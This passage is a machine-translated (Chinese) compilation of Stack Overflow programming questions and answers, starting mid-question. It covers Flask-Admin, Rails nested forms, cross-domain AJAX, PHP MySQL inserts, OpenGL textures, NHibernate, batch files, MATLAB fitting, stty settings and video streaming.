
class Profile(BaseView):
    @expose('/', methods=('GET', 'POST'))
    def profile(self):
        user = User(uid) # gets the user's data from DB
        form = ProfileForm(request.form, obj=user)
        if form.validate_on_submit():
            data = form.data
            user.set(**data)
            user.save()
            flash("Your profile has been saved")
        else:
            flash("form did not validate on submit")
        return self.render('user/profile.html', form=form, data=user)

user_view.add_view(Profile(name='Profile', url='profile')) 
```

* * *

提交表单时，wtforms 不会报告任何错误（除非有任何错误）但验证不会返回到我的配置文件视图（else: 分支始终执行）

尽管彻底扫描了烧瓶管理文档、源代码和示例，但我找不到任何方法来完成这项工作。

有人可以建议我如何修复我的代码，或者解决这个问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T14:20:12.367

我怀疑表单是使用 GET 方法而不是 POST 提交的，或者 Flask-WTF CSRF 检查失败。

这是我用您的示例代码制作的小要点。它按预期工作：[https ://gist.github.com/4556210](https://gist.github.com/4556210)

几点评论：

1.  模板使用一些 Flask-Admin 库函数来呈现表单。如果您不想使用它们，则不必使用它们；
2.  使用模拟用户对象
3.  如果要运行示例，请将模板放在模板/子目录下。

在任何一种情况下，Flask-Admin 视图的行为方式都与“普通”Flask 视图完全相同，只是它们的组织方式不同。

# eclipse - 如何在 Eclipse 中保存 *.launch 收藏夹的顺序？

> ID：14348956
> 
> 赞同：0
> 
> 时间：2013-01-15T23:36:39.257
> 
> 标签：eclipse

我有一个 eclipse 项目存储在包含`*.launch`文件的 subversion 中。问题是每次有人导入项目时，与`*.launch`文件对应的外部工具的顺序都会发生变化。订单存储在哪里？是否可以将该排序与项目一起存储在颠覆中，以便在每次导入时，排序都是相同的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-05T14:44:47.607

文件的显示顺序似乎`*.launch`不是随机的，而是按字母顺序排列的。

例子：

*   FixClassPathForTesting
*   手动 systemTest 类路径
*   跑我第一
*   BAR-FullDeploy
*   BAR-重启
*   FOO-FullDeploy
*   FOO-重启

我不知道规则，但如果文件有一个共同的前缀，它似乎对文件进行分组，并在非前缀文件之后显示这些文件。（注意“FixClassPathForTesting”在“BAR-*”之前）

没有办法指定所需的顺序，但摆弄每个`*.launch`文件的名称可能会产生所需的顺序。

# javascript - 通过精确裁剪图像来删除 while 循环

> ID：14348958
> 
> 赞同：0
> 
> 时间：2013-01-15T23:36:49.170
> 
> 标签：javascript, image, crop

我一直盯着/玩这个代码太久了！

使用`currentCrop`(x,y,width,height) 裁剪图像。`currentCrop`是根据图像必须位于的可用尺寸预先计算的。

`cropCentre`(x,y) 是存储作物中心点的临时变量。

`desiredPoint`(x,y) 是图像中希望显示的一个点，因此一旦计算出裁剪，最好改变图像裁剪以便`cropCentre`（从而`currentCrop`）尽可能接近`desiredPoint`，但要确保`currentCrop`确实如此不要超出图像的范围。

以下代码有效，但我确信无需任何 while 循环也可以实现相同的效果：

```
if ( cropCentre.x < desiredPoint.x ) {
    while( currentCrop.x + currentCrop.width < sourceWidth && cropCentre.x < desiredPoint.x ) {
        cropCentre.x = currentCrop.x + currentCrop.width / 2;
        currentCrop.x ++;
    }
} else if ( cropCentre.x > desiredPoint.x ) {
    while( currentCrop.x > 0 && cropCentre.x > desiredPoint.x ) {
        cropCentre.x = currentCrop.x + currentCrop.width / 2;
        currentCrop.x --;
    }
}

// code for vertical omitted - if the problem can be solved for x, then the solution for y is identical... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-05T07:56:37.453

`currentCrop.x = Math.min(Math.max(desiredPoint.x - currentCrop.width/2, 0), sourceWidth-currentCrop.width)`

# jquery - 响应式全屏 div（跟随垂直滚动）

> ID：14348962
> 
> 赞同：4
> 
> 时间：2013-01-15T23:37:01.127
> 
> 标签：jquery

我正在尝试创建一个全屏 div，因此它会根据浏览器窗口的高度和宽度调整大小。

但是你可以垂直滚动到第二个 div，这也是你的浏览器窗口的大小。

我见过很多这种风格的例子，但找不到任何教程。也许我有错误的关键词？

一个很好的例子是[http://www.guestd.com](http://www.guestd.com)（除了我不需要背景图片，只需要两个div）。

谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-15T23:46:54.057

使用纯 CSS，您可以非常简单地做到这一点。

**HTML**

```
<div class='tile' id='a'>

</div>
<div class='tile' id='b'>

</div> 
```

**CSS**

```
body,html {
  width: 100%;
  height: 100%;
}
.tile {
  height: 100%;
  width: 100%;
  position: relative;
  background-color: #eaeaea;
}
#a {
  background-color: #222;
} 
```

会给你[这个](http://jsfiddle.net/htHj3/)

# sendmail - 电子邮件正文中的 Sendmail 调试

> ID：14348969
> 
> 赞同：1
> 
> 时间：2013-01-15T23:37:40.330
> 
> 标签：sendmail

情况：电子邮件从托管我们生产网站的服务器发送。电子邮件正文包含电子邮件的路由。

问题：这是一个 sendmail.cf 参数吗？如果是，哪个参数？

示例：来自电子邮件正文。

```
Received: by 10.76.162.102 with SMTP id xz6csp105065oab; Tue, 8 Jan 2013 00:14:35 -0800 (PST)
Received: from mail-la0-f53.google.com (mail-la0-f53.google.com [209.85.215.53]) by mx.google.com with ESMTPS id id8si106587047lab.0.2013.01.08.00.14.32 (version=TLSv1/SSLv3 cipher=OTHER); Tue, 08 Jan 2013 00:14:33 -0800 (PST)
Received: by mail-la0-f53.google.com with SMTP id fn20so132960lab.40 for <marion@efactor.com>; Tue, 08 Jan 2013 00:14:32 -0800 (PST)
Received: by 10.112.29.229 with SMTP id n5mr26704397lbh.130.1357632872532; Tue, 08 Jan 2013 00:14:32 -0800 (PST) 
```

# ruby-on-rails - 需要帮助了解如何在嵌套表单中添加和/删除对象

> ID：14348974
> 
> 赞同：0
> 
> 时间：2013-01-15T23:38:04.307
> 
> 标签：ruby-on-rails, nested-forms, rails-activerecord

我无法将嵌套模型中的数据添加到我的数据库中。

我有一个与 Monster 模型具有以下关系的 Photo 模型。我可以为怪物添加和删除我的嵌套表单，但在更新我的照片时无法弄清楚如何实际添加新的怪物对象。这是基于[http://railscasts.com/episodes/196-nested-model-form-revised](http://railscasts.com/episodes/196-nested-model-form-revised)示例中的 1 个嵌套级别表单，基本上是调查 - 问题关系演示。

```
class Photo < ActiveRecord::Base
  attr_accessible :title, :monsters_attributes

  has_and_belongs_to_many :monsters

  accepts_nested_attributes_for :monsters, allow_destroy: true
end

class Monster < ActiveRecord::Base
  attr_accessible :first_name, :last_name, :selected

  has_and_belongs_to_many :photos
end 
```

我确定问题出在我的照片控制器上，并且我对如何使用更新照片表单时提交的参数了解甚少。提交带有两个怪物的编辑照片表单时，我得到以下参数哈希。第一个已经关联，第二个我试图通过单击“添加怪物”链接来声明，输入名字和姓氏，然后提交表格。

“添加怪物”链接是在我的 _form.html.erb 文件中为照片定义的，我正在使用部分来呈现字段。辅助函数在 application_helper.rb 中声明。

### _form.html.erb

```
…
    <!-- this uses the _monster_fields partial -->
    <%= f.fields_for :monsters do |builder| %>
      <%= render 'monster_fields', f: builder %>
    <% end %>        

  </table>

  <%= link_to_add_fields "Add Monster", f, :monsters %>
...

application_helper.rb

module ApplicationHelper

  def link_to_add_fields(name, f, association)
    new_object = f.object.send(association).klass.new  # make instance of monster association record, Monster.new
    id = new_object.object_id                          # get id of new monster object, id = Monster.new.object_id

    fields = f.fields_for(association, new_object, child_index: id) do |builder|
      render(association.to_s.singularize + "_fields", f: builder)    # render partial _monster_fields.html.erb
    end

    link_to(name, "#", class: "add_fields", data: {id: id, fields: fields.gsub("\n", '&#xA')}) # returns a link    
  end
end 
```

### 从照片的编辑（更新）显示的参数以显示：

```
{
"utf8"=>"✓", 
"_method"=>"put", 
"authenticity_token"=>"8dYkFrzdkulBv8YrZCHU2wfFh4v5LQc9q/JWPmsbDkc=", 
"photo"=>{"title"=>"Family Gathering", 
    "monsters_attributes"=>{
    "0"=>{"first_name"=>"Franken", "last_name"=>"Stein", "_destroy"=>"false", "id"=>"1"}, 
    "1358291763102"=>{"first_name"=>"Ware", "last_name"=>"Wolf", "_destroy"=>"false"}
    }, 
    "monster_ids"=>"1"
   }, 
"commit"=>"Update Photo", 
"action"=>"update", 
"controller"=>"photos", 
"id"=>"1"
} 
```

在我的 applcation.js 文件中，我定义了如何处理字段的添加和删除。在 .add_fields 中，该示例使用我新创建的对象的 id，但我看不到如何将新创建的怪物保存在 monsters 表中。

### 应用程序.js

```
$(document).ready(function() {

  $('form').on('click', '.remove_fields', function(event) {
    $(this).prev('input[type=hidden]').val('1');
    $(this).closest('tr').hide();
    event.preventDefault();
  });

  $('form').on('click', '.add_fields', function(event) {
    time = new Date().getTime();
    regexp = new RegExp($(this).data('id'), 'g');
    $(this).before($(this).data('fields').replace(regexp, time))    
    event.preventDefault();
  });

}); 
```

总的来说，这是一个非常简单的过程，但我不确定如何从我的照片编辑视图中实际保存一个新怪物（创建一个新的活动记录对象）。

我在使用多对多关系时会遇到问题吗？

railscasts 的示例很好，但还没有走那么远。我很感激有人可能提供的任何帮助。

[http://railscasts.com/episodes/196-nested-model-form-revised](http://railscasts.com/episodes/196-nested-model-form-revised)

## 2013 年 1 月 16 日更新：我的参数哈希和我得到的错误

ActiveModel::MassAssignmentSecurity::PhotosController#update 中的错误

无法批量分配受保护的属性：monster_ids

app/controllers/photos_controller.rb:76:in `block in update' app/controllers/photos_controller.rb:75:in`update'

```
{"utf8"=>"✓",
 "_method"=>"put",
 "authenticity_token"=>"1l62Sged52hnEHQoj0WPf/asRjcIpIKBBzsb7gVDRm0=",
 "photo"=>{"title"=>"Family Gathering",
 "monsters_attributes"=>{"0"=>{"first_name"=>"Franken",
 "last_name"=>"Stein",
 "_destroy"=>"false",
 "id"=>"1"},
 "1358356969634"=>{"first_name"=>"Scary",
 "last_name"=>"Frank",
 "_destroy"=>"false"}},
 "monster_ids"=>"1"},
 "commit"=>"Update Photo",
 "id"=>"1"} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T14:51:16.857

嵌套属性的美妙之处在于不存在对控制器代码的影响。你可以继续做

```
photo.update_attributes params[:photo] 
```

怪物将根据需要得到更新和删除：`photo.monsters_attributes=`将由 update_attributes 调用，数据来自`params[:photo][:monsters_attributes]`. 调用`accepts_nested_attributes_for`将（除其他外）创建一个合适的`monsters_attributes=`方法

# php - ajax跨域发布到php kohana 3.2不起作用

> ID：14348978
> 
> 赞同：1
> 
> 时间：2013-01-15T23:38:33.300
> 
> 标签：php, jquery, ajax, cross-domain, kohana

我有 2 个（本地）子域：`kohana.local.com`和`wordpress.local.com`. jQuery 插件 (.js) 位于 kohana.local.com 域，负责对两个域的文章进行评分和检索率计数。Controller_Rating 扩展了控制器。方法（action_getrating）具有以下代码（kohana 3.2）：

```
if($this->request->post() && $this->request->is_ajax()){
    $this->auto_render = FALSE;
    echo "{$_REQUEST['callback']}(".json_encode($data).")";
} 
```

阿贾克斯调用：

```
$.ajax({
    type: "POST",
    url: "http://kohana.local.com/rating/getrating",
    dataType: "jsonp",
    data: { some_id: id },
    success: function(json){
            //do something
    }
}); 
```

当从 kohana.local.com 发出 ajax 调用时，一切正常。如果它是从 wordpress.local.com 发出的，则它`$this->request->is_ajax()`是错误的，并且方法不是“发布”，而是以某种方式“获取”。这是什么原因，以及如何使其发挥作用？Post 是必需的，is_ajax 有利于安全和验证。

提前致谢。

**编辑：** 发布到 jsonp 是不可能的，所以我不能使用这种方法。我将不得不尝试在 json 的方向上找到解决方案

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:44:21.137

您可以简单地使用`json`dataType，因此您不需要使用回调。只需将标头添加`Access-Control-Allow-Origin`到发出请求的服务器（kohana.local.com）。

允许所有域：

```
Access-Control-Allow-Origin: * 
```

或指定允许的域：

```
Access-Control-Allow-Origin: http://wordpress.local.host 
```

规格：[http ://www.w3.org/TR/2008/WD-access-control-20080912/#access-control-allow-origin](http://www.w3.org/TR/2008/WD-access-control-20080912/#access-control-allow-origin)

* * *

多域解决方案：[Access-Control-Allow-Origin Multiple Origin Domains？](https://stackoverflow.com/questions/1653308/access-control-allow-origin-multiple-origin-domains)

# php - 使用 PHP 将数组插入 MySQL

> ID：14348979
> 
> 赞同：0
> 
> 时间：2013-01-15T23:38:37.327
> 
> 标签：php, mysql, arrays

我正在尝试使用 PHP 将数组插入 MySQL。我遵循这里给出的优秀建议来使用 implode 命令，它对一个阵列非常有效，但这个阵列似乎正在死去。这个数组与另一个略有不同，但我不知道如何解释这种差异。

这是我的代码：

```
 $sql = array(); 
foreach( $ride_detail as $row ) {
    $sql[] = '('.$row['id'].', "'.mysql_real_escape_string($row['name']).'",
  "'.$row['version'].'")';
}
mysql_query('INSERT IGNORE INTO ride (ride_id, name, version) VALUES '.implode(',', $sql)); 
```

我一遍又一遍地收到这条消息。

```
Warning: Illegal string offset 'id' in ride_details.php on line 60

Warning: Illegal string offset 'name' in ride_details.php on line 60

Warning: Illegal string offset 'version' in ride_details.php on line 61 
```

我的数组的内容（使用 print_r）是：

> Array ( [id] => 21570117 [name] => 晚上下班回家 [start_date_local] => 1347302039 [elapsed_time] => 53:56 [moving_time] => 52:04 [distance] => 12.6 >>[average_speed ] => 14.5 [elevation_gain] => 474 [location] => 恩格尔伍德，CO [start_latlng] => 阵列（[0] => 39.547792011872 [1] => -104.86300536431）[end_latlng] => 阵列（[0] = > 39.655485888943 [1] => -104.88656991161 ) [版本] => 1355428869 [运动员] => 数组 (>>[id] => 832001 [名称] => Bob Kratchet [用户名] => bob_kratchet) [自行车] =>数组（[id] => 281303 [name] => Giant Allegre commuter）[maximum_speed] => 29.3 [calories] => 372 >[average_power] => 107 [commute] => 1）

我是一个完全的菜鸟...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T00:12:46.727

由于您`$ride_detail`只是一个数组，`$row`因此是`21570117`（整数），`Night ride home from work`（字符串）等，一一对应。然后代码尝试获取`id`每个元素的键，然后是`name`键，依此类推，生成*[expletive]* -ton 的错误消息。

看起来您打算`$ride_detail`成为一个数组数组，或者您实际上根本不想要一个`foreach`循环。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T00:34:40.257

尝试这个

```
 foreach( $ride_detail as $row ) {
     $sql = array( $row['id'], mysql_real_escape_string($row['name']), $row['version'])  ;

         }
  mysql_query('INSERT IGNORE INTO ride (ride_id, name, version) VALUES  ($sql[0] ,$sql[1] , $sql[2] ) '); 
```

# opengl - 纹理停止正常工作

> ID：14348982
> 
> 赞同：1
> 
> 时间：2013-01-15T23:38:50.790
> 
> 标签：opengl, textures

最近我的纹理变得疯狂。我尝试映射的最后 2 个纹理如下图所示。我希望它出现在第一张照片中，但无论我做什么，它都坚持出现在后一张照片中。请忽略文字，它与纹理无关。

![在此处输入图像描述](../Images/3ee4879f95e02d899b80e3ffbb6c79aa.png) ![在此处输入图像描述](../Images/a96af21bfb7ffb22867eaefcc7f01ae7.png)

我正在为我的 openGL 窗口和 GLM obj loader 的 tga 阅读器使用 GLUT。我之前多次使用阅读器，没有任何问题。它刚刚停止了我最近两次加载纹理的尝试。相关代码如下：

```
Texture onScreenTexture;

if (LoadTGA(&onScreenTexture, "back.tga")) 
    { 
        glGenTextures(1, &onScreenTexture.texID);
        glBindTexture(GL_TEXTURE_2D, onScreenTexture.texID);
        glTexImage2D(GL_TEXTURE_2D, 0, onScreenTexture.bpp / 8, onScreenTexture.width, onScreenTexture.height, 0, onScreenTexture.type, GL_UNSIGNED_BYTE, onScreenTexture.imageData);

        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);

        if (onScreenTexture.imageData) 
        {
            free(onScreenTexture.imageData);
        }
    }

glEnable(GL_TEXTURE_2D);
    glBindTexture(GL_TEXTURE_2D, onScreenTexture.texID);
    glTexEnvf(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_DECAL);

    glBegin(GL_QUADS);
        glTexCoord2f(0,0); glVertex2f(10.0, 10.0);
        glTexCoord2f(0,1); glVertex2f(260, 10.0);
        glTexCoord2f(1,1); glVertex2f(260, 110);
        glTexCoord2f(1,0); glVertex2f(10.0, 110);
    glEnd();
    glDisable(GL_TEXTURE_2D); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T09:39:47.740

这与宽度/高度的比率无关（尽管您似乎将其渲染为 90 度旋转，导致一些额外的拉伸），但与像素行的打包有关。这从对角线图案中很明显，表明存在渐进对齐问题，还有彩色条纹，表明 RGB 数据在每条线上的未对齐方式不同。

在您的情况下，您正在加载一个 TGA，它没有行填充，但将其传递给 GL，默认情况下期望像素行填充为 4 个字节的倍数。

您的工作纹理可能是 32 位而不是 24 位，或者是 4 像素宽的倍数，这两者都可以提供自然对齐。

可能的解决方法是：

*   更改纹理的尺寸，以便没有填充。
*   更改纹理的加载，使填充与 GL 期望的一致
*   告诉 GL 你的纹理是如何打包的，使用（例如）`glPixelStorei(GL_UNPACK_ALIGNMENT, 1);`

# knockout.js - 为什么 Breeze TODO 示例中的 markAllCompleted 是“计算的”？

> ID：14348983
> 
> 赞同：0
> 
> 时间：2013-01-15T23:39:12.147
> 
> 标签：knockout.js, breeze

出于示例目的，markAllCompleted 是否实现为计算？看起来复选框检查绑定应该是一个函数，并且 addItem 中的用法应该是一个常规的 observable。

只是真的很好奇。当谈到 Breeze 和 Knockout 时，我仍然相当笨拙......事实上，也许这是一个 Knockout 问题而不是 Breeze 问题......

（作为参考，我在下面包含了相关代码）

当我觉得答案应该很明显时，我讨厌问问题，但事实并非如此。我忍不住问道。

谢谢！

```
 function addItem() {
        var item = dataservice.createTodo();

        item.IsDone(vm.markAllCompleted());
        item.Description(vm.newTodo());
        item.CreatedAt(new Date());

        if (item.entityAspect.validateEntity()) {
            extendItem(item);
            vm.items.push(item);
            dataservice.saveChanges();
            vm.newTodo("");
        } else {
            handleItemErrors(item);
        }
    }

        vm.markAllCompleted = ko.computed({
            read: function () {
                var state = getStateOfItems();
                return state.itemsLeftCount === 0 && vm.items().length > 0;
            },
            write: function (value) {
                suspendItemSave = true;
                vm.items().forEach(function (item) {
                    item.IsDone(value);
                });
                suspendItemSave = false;
                dataservice.saveChanges();
            }

<input id="markAll" type="checkbox" data-bind="checked: markAllCompleted"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T00:26:08.673

我认为这里的混乱主要是由于计算值的命名不当造成的`markAllCompleted`。您描述的替代方式（将单击绑定到函数）与按钮（无状态）相关，而不与复选框（具有自己的状态，真或假）相关。

此计算的（可以说）更合适的名称将类似于`allItemsDone`. 一个更简单的实现不会让你写入这个值（即它是一个简单的只读计算，在视图中它是一个只读复选框或等效项）。但是由于演示实现*确实*具有此功能（让用户选中/取消选中主复选框），因此计算也需要具有写入功能，但它可以保持计算状态，而不是简单的只读功能。

# nhibernate - 如何防止 NHibernate 在只读取数据的会话期间调用 Flush

> ID：14348986
> 
> 赞同：0
> 
> 时间：2013-01-15T23:39:16.340
> 
> 标签：nhibernate, fluent-nhibernate

当我运行此代码时，List 方法会导致 Developer 刷新。我不希望这种情况发生。

```
Developer developer = null;
IEnumerable<Language> languages = null;
using (var session = this.SessionFactory.OpenSession())
using (var trx = session.BeginTransaction())
{
    developer = session.Get<Developer>(id);
    languages = session.CreateCriteria<Language>().List<Language>();
} 
```

如果我交换其中的行`using`以便首先检索语言，则不会刷新开发人员。但我不想记住这样做，除非有充分的理由。

我需要更改我的映射吗？这是它现在的样子：

```
class DeveloperMap : ClassMap<Developer>
{
    public DeveloperMap()
    {
        Table("Developers");
        Id(x => x.Id).GeneratedBy.Identity();
        Map(x => x.FirstName);
        Map(x => x.LastName);
        References(x => x.FavoriteLanguage).Cascade.None();
        HasManyToMany(x => x.AssignedProjects)
            .Cascade.None()
            .Table("DevelopersProjects")
            .FetchType.Join();
    }
} 
```

这里也是 Developer 类，以防万一。

```
public class Developer
{
    public virtual int? Id { get; set; }
    public virtual string FirstName { get; set; }
    public virtual string LastName { get; set; }
    public virtual Language FavoriteLanguage { get; set; }
    public virtual IList<Project> AssignedProjects { get; protected internal set; }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T11:11:09.913

如果您不更改数据，则根本不应该刷新，除非您有鬼（不正确的映射会强制进行不必要的更新）。我建议您验证（使用探查器、检查 SQL 日志等）准确刷新的内容。

为了防止自动刷新，只需设置`session.FlushMode`为`Auto`（默认）或`Always`. `Commit`在我看来，是最实际的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T15:51:08.957

我曾多次指出，将只读操作包装在 a`Transaction`中往往会导致不良影响。正如 Diego 提到的，这`Flush`可能是由不正确的映射引起的。

我知道这可能存在一些性能问题，如此[处](http://www.hibernatingrhinos.com/products/nhprof/learn/alert/donotuseimplicittransactions)所述。但是，如果您只是阅读，则不需要`using(Transaction)`块。

尝试删除它，因此，

```
using (var session = this.SessionFactory.OpenSession())
{
    developer = session.Get<Developer>(id);
    languages = session.CreateCriteria<Language>().List<Language>();
} 
```

# php - jQuery ajax 调用 php 脚本返回“[object Object]”

> ID：14348987
> 
> 赞同：0
> 
> 时间：2013-01-15T23:39:16.460
> 
> 标签：php, ajax, object

我有一个带有以下代码的 jQuery ajax 调用：

```
var dataString = 'title=' + title;
alert ('datastring: ' + dataString); // This reports the correct value

$.ajax({
type: 'POST',
url: 'script.php',
data: dataString,
cache: false,
success: function(newTableID) {
    alert ('newTableID: ' + newTableID);
    // Do some stuff with the ID
},
error: function(response) {
    alert('failed: ' + response); 
            // The above displays "failed: [object Object]"
}
}); 
```

不管我在我的 php 脚本中有什么，我仍然得到相同的结果：ajax 调用的错误部分中的警报显示一个消息框，显示“失败：[object Object]”。我什至在 php 脚本中尝试了一个简单的 echo - 我认为 php 脚本根本没有从这个 ajax 调用中运行。

脚本的 url 是正确的 - js 文件和 script.php 文件在同一个文件夹中。

任何人都可以阐明我在这里可能缺少的东西吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:45:51.430

如果您收到失败，那是因为您`script.php`不可用。您可以尝试使用`console.log(response)`而不是，`alert()`您应该使用 Firefox 或 Chrome 调试工具查看变量中的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:50:50.930

`error`回调正在传递一个对象，但只能`alert()`显示字符串。除了一些神奇的情况之外，在 JS 中将对象转换为字符串会为您提供 '[Object object]'。

尝试使用`console.log`而不是`alert`，它将在浏览器的调试控制台中显示对象的结构（通常使用 F12 调用）

同样在控制台中（或者如果您安装了[Firebug](http://getfirebug.com)）将是一个显示网络请求和响应的面板，这可能会让您了解为什么会出现错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-08T15:27:37.860

你必须放置 : 而不是 =

```
var dataString = 'title:' + title; 
```

# iframe - 使用 Colorbox 加载多个 iframe（使用 Next/Prev）

> ID：14348989
> 
> 赞同：0
> 
> 时间：2013-01-15T23:39:24.483
> 
> 标签：iframe, colorbox

我正在使用颜色框显示 iframe，但它可以显示下一个/上一个按钮与分组照片相同吗？ [http://www.jacklmoore.com/colorbox/example1/](http://www.jacklmoore.com/colorbox/example1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T06:08:01.237

取决于您计划如何使用 iframe。但是要将链接组合在一起，请使用 colorbox 的 rel 属性：

```
$('a.iframe').colorbox({rel:'my_iframes'}); 
```

在这里，“my_iframes”可以是任何标识符。只是必须是一些东西，以便颜色框知道哪些元素可以组合在一起。

# batch-file - 如何将字符串的单个实例从一个文本文件复制到一个新的文本文件中？

> ID：14348990
> 
> 赞同：1
> 
> 时间：2013-01-15T23:39:35.873
> 
> 标签：batch-file, copy, dos, findstr

我有一个包含 n 行的文本文件。m 行包含我感兴趣的字符串 (m<=n)。我需要一个批处理文件，它只将包含字符串的单行（例如第一次出现）复制到新的文本文件中。当我使用 findstr 命令时，它将复制包含该字符串的所有行。

谢谢！保罗·萨菲尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T01:14:55.533

给定您的查找 m 行的 FINDSTR 命令（它可以根据需要简单或复杂）

```
findstr "search" "fileName.txt" 
```

然后您可以使用 FOR /F 循环处理该命令的结果。您可以使用 GOTO 在第一条匹配行之后跳出循环。

```
for /f "delims=" %%A in ('findstr "search" "fileName.txt"') do (
  echo %%A >>"outFile.txt"
  goto :break
)
:break 
```

FOR 命令是可用于批处理的更复杂的命令之一。有很多选择。您可以通过键入`HELP FOR`或`FOR /?`从命令提示符获取有关该命令的帮助。

"DELIMS=" 选项禁用将行解析为标记。如果没有该选项， FOR /F 会将每一行分成由空格或制表符分隔的标记。分隔符列表可以设置为其他字符，或者在您的情况下，设置为空。

我上面给出的代码将跳过以开头的行，`;`因为 FOR /F 将跳过任何以 EOL 字符开头的行 -`;`默认情况下。您可以将 EOL 字符更改为任何单个字符。但是，如果您不知道匹配行的开头可能是什么，那么您就不知道 EOL 使用什么字符。完全禁用所有令牌解析和 EOL 行跳过的语法很奇怪：

```
for /f delims^=^ eol^= %%A in (...) do ... 
```

# matlab - 在 Matlab 中以编程方式从“基本拟合”GUI 再现“评估”功能

> ID：14348992
> 
> 赞同：1
> 
> 时间：2013-01-15T23:39:42.457
> 
> 标签：matlab, curve-fitting, data-fitting, model-fitting

使用“基本拟合”工具时，一旦“拟合”完成，就有机会评估/估计某些点的值。我只能复制到绘图部分。我无法弄清楚如何以编程方式重现“评估”函数，以便我可以估计某些点的值并在我的代码中使用它们。我现在能做到这一点的唯一方法是通过图形用户界面，即从图形窗口的主菜单：“工具>>基本拟合”

![截屏](../Images/fe34696c4c077311fb8fe07a420bf3f7.png)

我不确定我是否足够清楚，但请随时询问您是否需要更多信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T05:31:30.863

您的问题的答案取决于您要安装的特定模型类型。如果您只是对多项式拟合或更复杂的东西感兴趣，您的问题尚不清楚。对于多项式，您可以使用该`polyfit`函数来获取系数，并使用该`polyval`函数在某些点进行评估。

```
%construct a test signal
x = linspace(0,1,100)';
signal = 5*x.^2 + x + 0.5;
noise = 0.1*rand(100,1);
y = signal + noise;

%Plot function
plot(x,[signal,y]);

%Polynomial fitting
n = 2; % order of polynomial
coeff = polyfit(x,y,n) % I get 5.0295, 0.9786, 0.5512

%Evaluate at a certain set of points
x1 = 2.3;
polyval(coeff,x1) 
```

如果您要拟合一个更复杂的模型，那么您将不得不使用`cfit`它来进行拟合，这将为您提供一个合适的对象。您必须将该 fit 对象传递给函数`feval`以在特定点评估函数。查看这些函数的文档以了解更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T08:30:00.923

除了 Karthik 的回答，如果您想继续使用交互式拟合但只是想稍后以编程方式评估事物，您应该按屏幕截图左侧的“保存到工作区...”以将拟合信息保存到工作区。默认情况下，这将创建一个名为`fit`MATLAB的变量`struct`，其字段`coeff`包含多项式系数。然后，您可以使用`polyval`来评估多项式，如下所示：

```
polyval(fit.coeff, 5); % get the value at 5 
```

# bash - stty 命令在 bash 点文件中的位置？.bash_profile？

> ID：14348995
> 
> 赞同：3
> 
> 时间：2013-01-15T23:40:06.490
> 
> 标签：bash, .bash-profile, stty

我正在尝试确保在我的所有终端/shell/tmux 中关闭流控制、xon-xoff、Control-S Control-Q 功能（以便我可以可靠地将 Control-S 用于其他用途）它应该在 X、urxvt、tmux、控制台、ssh 等任何地方工作。

配置应该放在哪个点文件中？应该是什么？我最好的猜测：

```
# check xon/xoff settings
# stty -a | egrep -o -- '-?\<(ix\w*|start|stop)'

if [ -t 0 ]; then # term test?
    # Turn off TTY "start" and "stop" commands in all interactive shells.
    # They default to C-q and C-s, Bash uses C-s to do a forward history search.
    stty start ''
    stty stop  ''
    stty -ixon # disable XON/XOFF flow control
    stty ixoff # enable sending (to app) of start/stop characters
    stty ixany # let any character restart output, not only start character
fi 
```

我在我的机器上找到的示例使用 .bash_profile，但这似乎并没有抓住我的非登录 shell。另一方面，在 .bashrc 中放置 stty 调用假定有一个终端，我应该只测试一个终端（ if [ -to ] ）还是检查 $PS1？

也许有比“stty”更好的方式来配置我的终端？也许我应该让所有 bash 实例登录 shell？

stty 是我想避免的那些神秘的谜团之一。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:47:41.960

使用`Control-S`等，仅在交互式外壳中才有意义。所以，我会把它放进去`.bashrc`，并确保测试 shell 是否真的是[交互式](http://www.gnu.org/software/bash/manual/bashref.html#Is-this-Shell-Interactive_003f)的。

# algorithm - 缓冲/流式在线视频背后的算法是什么？

> ID：14348998
> 
> 赞同：2
> 
> 时间：2013-01-15T23:40:31.527
> 
> 标签：algorithm, youtube, video-streaming, vimeo

这仅仅是根据网络速度调整预缓冲内容量的问题吗？你是否在一开始就调整一次，每一秒……？

或者它更复杂 - 对您的网络速度记录的历史记录进行采样并获取平均值/中值并对其进行调整？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:29:26.387

你的第二段总结得很好。

客户端查看前一块音频/视频*（通常只有一两秒的价值）*下载的速度，然后请求它认为可以足够快地处理下载的视频比特率。它总是在未来至少几秒钟内缓冲（下载），以便在下一块音频/视频下载速度比预期慢的情况下给自己留出余地。

请注意，比特率和分辨率的每种组合都需要单独编码。它们通常被预先编码并存储在服务器上。因此，有多少比特率可供选择，以及它们是什么，完全取决于编码和/或托管内容的人。